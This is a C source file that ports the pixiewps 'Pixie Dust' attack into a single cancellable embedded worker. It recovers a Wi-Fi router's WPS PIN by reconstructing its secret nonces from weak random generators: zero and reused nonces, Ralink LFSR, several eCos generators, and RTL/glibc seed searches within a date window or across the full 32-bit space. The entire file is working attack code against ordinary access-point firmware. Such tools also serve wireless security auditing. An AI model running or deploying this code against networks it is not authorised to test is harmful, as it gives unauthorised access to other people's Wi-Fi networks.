/* Pixiewps PRNG search port for a single cancellable embedded worker.
 * Derived from wiire-a/pixiewps (Copyright 2015-2017 wiire), GPL-3.0-or-later.
 * No subprocess, shared global job state, or pthread cancellation.
 * See COPYING.pixiewps and UPSTREAM.md. */
#include "core.h"
#define PWPS_UNERRING 1
#include "pixie_prng.h"
#include <string.h>
typedef struct {
  WfProgress cb;
  void *ctx;
  const char *phase;
} Progress;
static bool pin_yield(void *ctx, unsigned n, unsigned total) {
  Progress *p = ctx;
  return !p->cb || p->cb(p->ctx, p->phase, n, total);
}
static int crack(WfSession *s, const uint8_t a[16], const uint8_t b[16],
                 Progress *p) {
  int n = wf_crack_first(s, a, pin_yield, p);
  if (n <= 0)
    return n;
  return wf_crack_second(s, b, pin_yield, p);
}
static uint32_t word(const uint8_t *p) {
  return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
         ((uint32_t)p[2] << 8) | p[3];
}
static void rtl_nonce(uint8_t n[16], uint32_t seed) {
  uint32_t v[4];
  glibc_fast_nonce(seed, v);
  for (unsigned i = 0; i < 4; i++) {
    n[i * 4] = v[i] >> 24;
    n[i * 4 + 1] = v[i] >> 16;
    n[i * 4 + 2] = v[i] >> 8;
    n[i * 4 + 3] = v[i];
  }
}
static int rtl_secrets(WfSession *s, uint32_t seed, Progress *p) {
  uint8_t a[16], b[16];
  char first[9];
  p->phase = "RTL secret-nonce/PIN search";
  for (unsigned dist = 0; dist <= 600; dist++)
    for (unsigned sign = 0; sign < (dist ? 2u : 1u); sign++) {
      if (sign && seed < dist)
        continue;
      if (!sign && seed > UINT32_MAX - dist)
        continue;
      uint32_t candidate = sign ? seed - dist : seed + dist;
      rtl_nonce(a, candidate);
      int r = wf_crack_first(s, a, pin_yield, p);
      if (r < 0)
        return r;
      if (!r)
        continue;
      memcpy(first, s->pin, 9);
      for (unsigned off = 0; off < 10 && candidate <= UINT32_MAX - off; off++) {
        rtl_nonce(b, candidate + off);
        memcpy(s->pin, first, 9);
        r = wf_crack_second(s, b, pin_yield, p);
        if (r)
          return r;
      }
    }
  return 0;
}
int wf_pixie_all(WfSession *s, bool full, uint32_t epoch, WfProgress cb,
                 void *ctx) {
  if (!s || s->stage != 3)
    return -2;
  Progress p = {cb, ctx, "Zero secret nonces"};
  uint8_t a[16] = {0}, b[16] = {0};
  int r = crack(s, a, b, &p);
  if (r)
    return r < 0 ? r : 1;
  p.phase = "Reused public nonce";
  r = crack(s, s->enonce, s->enonce, &p);
  if (r)
    return r < 0 ? r : 3;
  p.phase = "Ralink LFSR reconstruction";
  struct ralink_randstate state = {0};
  for (int i = 15; i >= 0; i--)
    ralink_randstate_restore(&state, s->enonce[i]);
  uint32_t saved = state.sreg;
  unsigned k = 0;
  for (; k < 16; k++)
    if (ralink_randbyte(&state) != s->enonce[k])
      break;
  if (k == 16) {
    state.sreg = saved;
    for (int i = 15; i >= 0; i--)
      b[i] = ralink_randbyte_backwards(&state);
    for (int i = 15; i >= 0; i--)
      a[i] = ralink_randbyte_backwards(&state);
    r = crack(s, a, b, &p);
    if (r)
      return r < 0 ? r : 1;
  }
  /* eCos simplest exposes only its low byte. All 256 initial low bytes
   * cover exactly the same observable nonce streams as all 2^32 seeds. */
  p.phase = "eCos simplest";
  for (unsigned low = 0; low < 256; low++) {
    uint32_t seed = low;
    for (k = 0; k < 16; k++)
      if ((uint8_t)ecos_rand_simplest(&seed) != s->enonce[k])
        break;
    if (k < 16)
      continue;
    for (k = 0; k < 16; k++)
      a[k] = ecos_rand_simplest(&seed);
    for (k = 0; k < 16; k++)
      b[k] = ecos_rand_simplest(&seed);
    r = crack(s, a, b, &p);
    if (r)
      return r < 0 ? r : 4;
  }
  p.phase = "eCos simple: 25-bit seed search";
  uint32_t known = (uint32_t)s->enonce[0] << 25;
  for (uint32_t counter = 0; counter < 0x02000000; counter++) {
    if ((counter & 4095) == 0 && cb && !cb(ctx, p.phase, counter, 0x02000000))
      return -1;
    uint32_t seed = known | counter;
    for (k = 1; k < 16; k++)
      if ((uint8_t)ecos_rand_simple(&seed) != s->enonce[k])
        break;
    if (k < 16)
      continue;
    for (k = 0; k < 16; k++)
      a[k] = ecos_rand_simple(&seed);
    for (k = 0; k < 16; k++)
      b[k] = ecos_rand_simple(&seed);
    r = crack(s, a, b, &p);
    if (r)
      return r < 0 ? r : 2;
  }
  /* RTL mode emits four positive 31-bit words. Quick mode follows upstream's
   * date-window default; full mode searches the complete 32-bit seed space. */
  if (!(s->enonce[0] & 128) && !(s->enonce[4] & 128) && !(s->enonce[8] & 128) &&
      !(s->enonce[12] & 128)) {
    uint64_t hi =
        full ? UINT32_MAX
             : (epoch > UINT32_MAX - 86400 ? UINT32_MAX : epoch + 86400u);
    uint64_t lo = full ? 0 : (epoch > 86400 ? epoch - 86400u : 0);
    uint64_t total = hi - lo + 1;
    p.phase =
        full ? "RTL full 32-bit seed search" : "RTL date-window seed search";
    for (uint64_t done = 0; done < total; done++) {
      if ((done & 4095) == 0 && cb && !cb(ctx, p.phase, done, total))
        return -1;
      uint32_t seed = (uint32_t)(hi - done);
      if (glibc_fast_seed(seed) != word(s->enonce))
        continue;
      rtl_nonce(a, seed);
      if (memcmp(a, s->enonce, 16))
        continue;
      r = rtl_secrets(s, seed, &p);
      if (r)
        return r < 0 ? r : 3;
      p.phase =
          full ? "RTL full 32-bit seed search" : "RTL date-window seed search";
    }
  }
  if (full) {
    p.phase = "eCos Knuth full 32-bit seed search";
    for (uint64_t index = 0; index <= UINT32_MAX; index++) {
      if ((index & 4095) == 0 && cb &&
          !cb(ctx, p.phase, index, UINT64_C(4294967296)))
        return -1;
      uint32_t seed = index;
      for (k = 0; k < 16; k++)
        if ((uint8_t)ecos_rand_knuth(&seed) != s->enonce[k])
          break;
      if (k < 16)
        continue;
      for (k = 0; k < 16; k++)
        a[k] = ecos_rand_knuth(&seed);
      for (k = 0; k < 16; k++)
        b[k] = ecos_rand_knuth(&seed);
      r = crack(s, a, b, &p);
      if (r)
        return r < 0 ? r : 5;
    }
  }
  s->pin[0] = 0;
  return 0;
}
